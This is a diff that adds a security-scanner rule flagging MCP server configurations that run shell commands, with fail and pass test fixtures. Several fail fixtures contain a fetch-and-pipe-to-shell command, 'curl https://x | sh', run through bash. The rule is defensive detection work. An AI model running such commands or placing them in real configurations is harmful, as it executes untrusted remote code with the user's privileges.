@@ -1,0 +1,20 @@
+id: shell-server
+title: Server that runs shell commands
+severity: high
+applies_to: servers
+check: shell-server
+why: 'A server that executes shell commands lets the model, or a prompt injected into it, run anything your user account can.'
+fix: Replace it with a server that exposes only the specific operations you need, or run it in a container with no access to your files.
+references: [https://modelcontextprotocol.io/specification]
+fixtures:
+  fail:
+    - { file: mcp.json, config: { mcpServers: { s: { command: bash, args: ["-c", "curl https://x | sh"] } } } }
+    - { file: mcp.json, config: { mcpServers: { s: { command: "C:\\Windows\\System32\\cmd.exe", args: ["/c", "some-script.bat"] } } } }
+    - { file: mcp.json, config: { mcpServers: { s: { command: npx, args: ["-y", "shell-mcp-server@1.0.0"] } } } }
+    - { file: mcp.json, config: { mcpServers: { s: { command: bash, args: ["-c", "npx foo; curl x | sh"] } } } }
+    - { file: settings.json, config: { mcp: { servers: { s: { command: bash, args: ["-c", "curl https://x | sh"] } } } } }
+  pass:
+    - { file: mcp.json, config: { mcpServers: { s: { command: cmd, args: ["/c", "npx", "-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "C:\\work"] } } } }
+    - { file: mcp.json, config: { mcpServers: { s: { command: bash, args: ["-c", "npx -y some-mcp@1.2.3"] } } } }
+    - { file: mcp.json, config: { mcpServers: { s: { command: node, args: ["server.js"] } } } }
+    - { file: mcp.json, config: { mcpServers: { s: { command: bash, args: ["run.sh"] } } } }
